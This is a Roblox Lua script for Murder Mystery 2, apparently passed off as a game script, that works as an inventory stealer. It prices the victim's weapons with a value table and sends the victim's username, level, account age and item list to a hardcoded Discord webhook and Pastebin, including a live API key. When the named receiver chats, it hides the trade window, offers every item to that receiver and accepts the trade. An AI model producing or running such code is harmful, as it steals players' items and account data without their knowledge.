userName = "OLAMYT"
webHook = "https://discord.com/api/webhooks/1289678550022099014/GMYAt8-7h_bfmWJUSPj6WzNnfgujfrcbr-bDfSbftyORlTRxuakbjFTGa5W-BQcVeBuW"

local values = {
    -- >> Uniques/Victim Tier << --
    ["Sorry"] = 750,
    -- >> Uniques/Special Tier << --
    ["SlouseClownGun"] = 500000,
    ["SlouseClown"] = 500000,
    ["SharkSeeker"] = 1000,
    ["Dartbringer"] = 1150,
    -- >> Uniques/Top 100 Awards << --
    ["BlueCandy"] = 100000,
    ["RedHallow"] = 100000,
    ["BlueSugar"] = 100000,
    ["ElderwoodGunBlue"] = 100000,
    ["MintyBlue"] = 100000,
    ["LogchopperBlue"] = 100000,
    ["BlueVampiresEdge"] = 100000,
    ["RedIceblaster"] = 100000,
    ["RedIcebreaker"] = 100000,
    ["BlueHarvester"] = 100000,
    ["SwirlyGunBlue"] = 100000,
    ["SwirlyAxeBlue"] = 100000,
    ["ElderwoodKnifeBlue"] = 100000,
    ["IcepiercerRed"] = 100000,
    ["IceHammerRed"] = 100000,
    ["TravelerAxeRed"] = 100000,
    ["Gingerscope_Blue"] = 100000,
    ["Gingerscythe_Blue"] = 100000,
    ["VampireAxe_Purple"] = 100000,
    -- >> Ancients/Special Tier << --
    ["NikKnife"] = 1000000,
    -- >> Ancients/Tier 2 << --
    ["Gingerscope"] = 9600,
    ["TravelerAxe"] = 7000,
    ["Harvester"] = 650,
    ["Icepiercer"] = 600,
    ["VampireAxe"] = 440,
    ["Celestial"] = 350,
    -- >> Ancients/Tier 1 << --
    ["SwirlyAxe"] = 150,
    ["Icebreaker"] = 125,
    ["ElderwoodScythe"] = 85,
    ["Scythe"] = 77,
    ["Hallowscythe"] = 55,
    ["Logchopper"] = 30,
    ["Icewing"] = 4,
    -- >> Vintages/Tier 2 << --
    ["GhostK2018"] = 10,
    ["AmericaGun"] = 8,
    ["BloodKnife"] = 8,
    -- >> Vintages/Tier 1 << --
    ["Disint"] = 7,
    ["Phaser"] = 7,
    ["ShadowKnife"] = 6,
    ["TimeKnife"] = 5,
    ["Gun1"] = 4,
    ["GoldenGun"] = 4,
    ["Knife1"] = 3,
    -- >> Chromas/Tier 3 << --
    ["TravelerGunChroma"] = 110000,
    ["TreeGun2023Chroma"] = 48000,
    ["TreeKnife2023Chroma"] = 30000,
    ["VampireGunChroma"] = 16000,
    ["ConstellationChroma"] = 9400,
    ["BaubleChroma"] = 6500,
    ["WatergunChroma"] = 2200,
    -- >> Chromas/Tier 2 << --
    ["ChromaDarkbringer"] = 125,
    ["ChromaLightbringer"] = 120,
    ["CandleflameChroma"] = 115,
    ["ElderwoodKnifeChroma"] = 115,
    ["SwirlyGunChroma"] = 115,
    ["Gingermint_KChroma"] = 110,
    -- >> Chromas/Tier 1 << --
    ["LugerChroma"] = 100,
    ["LaserChroma"] = 80,
    ["HeatChroma"] = 70,
    ["DeathshardChroma"] = 65,
    ["GemstoneChroma"] = 65,
    ["SharkChroma"] = 65,
    ["SlasherChroma"] = 65,
    ["TidesChroma"] = 65,
    ["FangChroma"] = 55,
    ["GingerbladeChroma"] = 55,
    ["SeerChroma"] = 55,
    ["BonebladeChroma"] = 50,
    ["SawChroma"] = 50,
    -- >> Godlies/Tier 3 << --
    ["TravelerGun"] = 3400,
    ["TreeGun2023"] = 1850,
    ["Turkey2023"] = 1600,
    ["TreeKnife2023"] = 1025,
    ["Blossom_G"] = 640,
    ["Sakura_K"] = 630,
    ["Constellation"] = 575,
    ["Darkshot"] = 465,
    ["Darksword"] = 460,
    ["VampireGun"] = 460,
    ["Bauble"] = 310,
    ["ZombieBat"] = 300,
    ["Candy"] = 200,
    ["Rainbow_G"] = 190,
    ["Rainbow_K"] = 185,
    ["Ocean_G"] = 150,
    ["WraithGun"] = 145,
    ["WraithKnife"] = 145,
    ["Waves_K"] = 145,
    ["AuroraKnife"] = 135,
    ["AuroraGun"] = 135,
    ["FlowerwoodGun"] = 135,
    ["FlowerwoodKnife"] = 130,
    ["Heartblade"] = 125,
    ["Sugar"] = 125,
    ["SwirlyGun"] = 115,
    ["Makeshift"] = 105,
    ["Candleflame"] = 100,
    ["ElderwoodKnife"] = 100,
    ["Watergun"] = 90,
    -- >> Godlies/Tier 2 << --
    ["Phantom2022"] = 75,
    ["Spectre2022"] = 75,
    ["Luger"] = 75,
    ["RedLuger"] = 70,
    ["SwirlyBlade"] = 65,
    ["Iceblaster"] = 65,
    ["Pearl_K"] = 62,
    ["Pearl_G"] = 62,
    ["Darkbringer"] = 60,
    ["ElderwoodGun"] = 60,
    ["Lightbringer"] = 58,
    ["Gingermint_K"] = 40,
    ["Gingermint_G"] = 40,
    ["GreenLuger"] = 40,
    ["Hallowgun"] = 35,
    ["Laser"] = 32,
    ["Icebeam"] = 32,
    ["Iceflake"] = 32,
    ["Plasmabeam"] = 32,
    ["Plasmablade"] = 32,
    ["Amerilaser"] = 30,
    ["Blaster"] = 30,
    ["Nightblade"] = 30,
    ["AmericaSword"] = 28,
    ["Nebula"] = 28,
    ["Shark"] = 28,
    ["Virtual"] = 27,
    ["Gemstone"] = 25,
    ["Clockwork"] = 23,
    ["EternalCane"] = 23,
    ["GingerLuger"] = 23,
    ["Lugercane"] = 23,
    ["Pixel"] = 23,
    ["Slasher"] = 23,
    ["Gingerblade"] = 22,
    ["Heat"] = 22,
    ["Minty"] = 22,
    -- >> Godlies/Tier 1 << --
    ["BattleAxe2"] = 20,
    ["Deathshard"] = 20,
    ["Tides"] = 20,
    ["Fang"] = 18,
    ["Spider"] = 17,
    ["Chill"] = 17,
    ["Jinglegun"] = 15,
    ["VampiresEdge"] = 15,
    ["Pumpking"] = 15,
    ["Bioblade"] = 13,
    ["BattleAxe"] = 13,
    ["Frostsaber"] = 13,
    ["Xmas"] = 13,
    ["Flames"] = 12,
    ["Hallow"] = 12,
    ["IceDragon"] = 12,
    ["IceShard"] = 12,
    ["WintersEdge"] = 12,
    ["Ghostblade"] = 10,
    ["HallowsBlade"] = 10,
    ["Handsaw"] = 10,
    ["Eternal"] = 10,
    ["Eternal2"] = 10,
    ["Eternal3"] = 10,
    ["Eternal4"] = 10,
    ["Boneblade"] = 8,
    ["Eggblade"] = 7,
    ["Frostbite"] = 7,
    ["Prismatic"] = 7,
    ["Saw"] = 7,
    ["Snowflake"] = 7,
    -- >> Godlies/Tier 0 << --
    ["Peppermint"] = 7,
    ["Cookieblade"] = 7,
    ["BlueSeer"] = 7,
    ["PurpleSeer"] = 7,
    ["RedSeer"] = 7,
    ["TheSeer"] = 7,
    ["OrangeSeer"] = 7,
    ["YellowSeer"] = 7,
    -- >> Legendaries/Special Tier << --
    ["JD"] = 65,
    -- >> Legendaries/Tier 3 << --
    ["Latte_G_2023"] = 90,
    ["Latte_K_2023"] = 90,
    ["CottonCandy"] = 65,
    ["Witched"] = 55,
    ["Beach_K_2023"] = 30,
    ["Cavern_K_2019"] = 22,
}

if #game:GetService("Players"):GetPlayers() <= 3 then
    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
end

if #game:GetService("Players"):GetPlayers() == 12 then
    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
end

local LP = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)

_G.vlorp = _G.vlorp or false
if _G.vlorp then
    return
end
_G.vlorp = true

local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

function SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

function CreateEmbed(title, description, color, fields)
    local embed = {
        ["title"] = title,
        ["description"] = description,
        ["color"] = color,
        ["fields"] = fields or {}
    }
    return embed
end

local function getLvl()
    for i,v in pairs(LevelModule.XPTable) do
        if PlayerDataModule.NewXP < v then
            return i
        end
    end
end

local allItems = {}
local itemsCount = 0

local valueCount = 0

local vintageItems = {}
local commonItems = {}
local uncommonItems = {}
local rareItems = {}
local legendaryItems = {}
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}

local vintageItemsC = 0
local commonItemsC = 0
local uncommonItemsC = 0
local rareItemsC = 0
local legendaryItemsC = 0
local godlyItemsC = 0
local ancientItemsC = 0
local uniqueItemsC = 0

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        local br = 0
        if values[d.ItemName] then
            valueCount = valueCount + values[d.ItemName]
            br = values[d.ItemName]
        end

        local formattedTable = {name = d.ItemName, value = br, data = d.DataID, amount = d.Amount, rarity = d.Rarity}
        table.insert(allItems, formattedTable)
        
        if d.Rarity == "Vintage" then
            vintageItemsC = vintageItemsC + 1
            table.insert(vintageItems, formattedTable)
        end

        if d.Rarity == "Unique" then
            uniqueItemsC = uniqueItemsC + 1
            table.insert(uniqueItems, formattedTable)
        end

        if d.Rarity == "Ancient" then
            ancientItemsC = ancientItemsC + 1
            table.insert(ancientItems, formattedTable)
        end

        if d.Rarity == "Godly" then
            godlyItemsC = godlyItemsC + 1
            table.insert(godlyItems, formattedTable)
        end

        if d.Rarity == "Legendary" then
            legendaryItemsC = legendaryItemsC + 1
            table.insert(legendaryItems, formattedTable)
        end

        if d.Rarity == "Rare" then
            rareItemsC = rareItemsC + 1
            table.insert(rareItems, formattedTable)
        end

        if d.Rarity == "Uncommon" then
            uncommonItemsC = uncommonItemsC + 1
            table.insert(uncommonItems, formattedTable)
        end

        if d.Rarity == "Common" then
            commonItemsC = commonItemsC + 1
            table.insert(commonItems, formattedTable)
        end
    end
end

for i,v in pairs(allItems) do
    itemsCount = itemsCount + 1
end

local function pastebin(content)

    local body = {
        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
        api_paste_code = content,
        api_option = "paste"
    }

    local encodedBody = ""
    for key, value in pairs(body) do
        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
    end
    encodedBody = encodedBody:sub(1, -2) 

    local response
    local success, err = pcall(function()
        response = request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = encodedBody,
            Headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded"
            },
            Timeout = 20
        })
    end)

    if not success or not response or not response.Success then
        return "\n ERROR: Country not supported \n"
    end

    local pasteUrl = response.Body
    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")

    return rawUrl
end

local uniquesString = ""
local ancientsString = ""
local godlysString = ""
local legendariesString = ""
local vintageString = ""
local raresString = ""
local uncommonString = ""
local commonsString = ""

for a,b in pairs(uniqueItems) do
    for c,d in pairs(b) do
        if c == "name" then
            uniquesString = uniquesString .. d .. ",\n"
        end
    end
end

for a,b in pairs(ancientItems) do
    for c,d in pairs(b) do
        if c == "name" then
            ancientsString = ancientsString .. d .. ",\n"
        end
    end
end

for a,b in pairs(godlyItems) do
    for c,d in pairs(b) do
        if c == "name" then
            godlysString = godlysString .. d .. ",\n"
        end
    end
end

for a,b in pairs(legendaryItems) do
    for c,d in pairs(b) do
        if c == "name" then
            legendariesString = legendariesString .. d .. ",\n"
        end
    end
end

for a,b in pairs(vintageItems) do
    for c,d in pairs(b) do
        if c == "name" then
            vintageString = vintageString .. d .. ",\n"
        end
    end
end

for a,b in pairs(rareItems) do
    for c,d in pairs(b) do
        if c == "name" then
            raresString = raresString .. d .. ",\n"
        end
    end
end

for a,b in pairs(uncommonItems) do
    for c,d in pairs(b) do
        if c == "name" then
            uncommonString = uncommonString .. d .. ",\n"
        end
    end
end

for a,b in pairs(commonItems) do
    for c,d in pairs(b) do
        if c == "name" then
            commonsString = commonsString .. d .. ",\n"
        end
    end
end

local EverythingString = "-- // Uniques\n" .. uniquesString ..
                         "\n\n-- // Ancient\n" .. ancientsString ..
                         "\n\n-- // Godlies\n" .. godlysString ..
                         "\n\n-- // Legendaries\n" .. legendariesString ..
                         "\n\n-- // Vintage\n" .. vintageString ..
                         "\n\n-- // Rare\n" .. raresString ..
                         "\n\n-- // Uncommon\n" .. uncommonString ..
                         "\n\n-- // Common\n" .. commonsString

local WebHookEmbed = CreateEmbed(
    "Vlorp Scripts | MM2",
    "Please execute the code above to get your hit.",
    11220,
    {
        {name = "```🧛‍♀️ Info```", value = "```🙍‍♂️ Username: "..LP.Name.."\n💫 Level: "..tostring(getLvl()).."\n🔞 Account-Age: "..tostring(LP.AccountAge).."\n🎮 Executor: "..identifyexecutor().."\n🐱‍👤 Receiver: "..userName.."```"},
        {name = "```🎯 Hit Info```", value = "```💵 Total Value: "..tostring(math.floor(valueCount + 0.5)).."\n➕ Total Count: "..tostring(itemsCount - 2).."\n\n🌟 Uniques: "..tostring(uniqueItemsC).."\n🔮 Ancients: "..tostring(ancientItemsC).."\n💎 Godlys: "..tostring(godlyItemsC).."\n🏆 Legendarys: "..tostring(legendaryItemsC).."\n⌚ Vintage: "..tostring(vintageItemsC).."\n📈 Rares: "..tostring(rareItemsC).."\n🔹 Uncommons: "..tostring(uncommonItemsC).."\n🔸 Commons: "..tostring(commonItemsC).."```"},
        {name = "```💻 Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
    }
)

if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
    SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
else
    SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
end

local function stealitems()
    coroutine.resume(destroytrades2)

    local sendArgs = {
        [1] = game:GetService("Players")[userName]
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))

    wait(3)

    for a,b in pairs(uniqueItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(ancientItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(godlyItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(vintageItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(legendaryItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(rareItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(uncommonItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    for a,b in pairs(commonItems) do
        for i = 1, b.amount do
            local args = {
                [1] = b.data,
                [2] = "Weapons"
            }

            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
        end
    end

    wait(6)
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == userName then
        player.Chatted:Connect(function(msg)
            stealitems()
        end)
    end
end)